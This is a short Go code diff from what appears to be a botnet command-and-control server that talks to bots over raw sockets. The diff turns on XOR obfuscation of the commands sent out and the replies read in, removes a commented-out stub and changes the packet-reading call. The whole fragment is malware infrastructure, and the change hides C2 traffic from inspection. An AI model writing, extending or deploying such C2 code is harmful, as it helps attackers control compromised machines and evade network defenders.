@@ -64,11 +64,6 @@ func banner() {
 	fmt.Println(string(b))
 }
 
-// Implement
-// func xorMsg(msg []string) {
-// 	 fmt.Print("Hello")
-// }
-
 func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 	// Forever loop to respond to bots
 	for {
@@ -102,7 +97,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 				}
 
 				// Wrap data
-				// data = xorData(data)
+				data = rawsocket.XORCipher(data)
 				data = rawsocket.AddIdentifier(data, false)
 
 				// Send packet
@@ -215,6 +210,7 @@ func cli() {
 func processPacket(packet gopacket.Packet, listen chan Host) {
 	// Get data from packet & Remove Identifier
 	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), true)
+	data = rawsocket.XORCipher(data)
 	payload := strings.Split(data, " ")
 
 	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
@@ -284,7 +280,7 @@ func main() {
 	go cli()
 
 	for {
-		packet := rawsocket.BothReadPacket(readfd, vm, true)
+		packet := rawsocket.ReadPacket(readfd, vm, true)
 		// Pass Packet to process function
 		if packet != nil {
 			go processPacket(packet, listen)
